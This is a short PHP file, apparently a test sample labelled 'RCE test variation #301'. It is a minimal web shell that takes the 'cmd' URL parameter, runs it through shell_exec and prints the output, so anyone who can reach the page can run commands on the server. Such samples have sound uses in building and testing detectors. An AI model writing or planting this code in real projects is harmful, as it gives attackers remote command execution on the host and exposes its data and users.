<?php
// RCE test variation #301
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>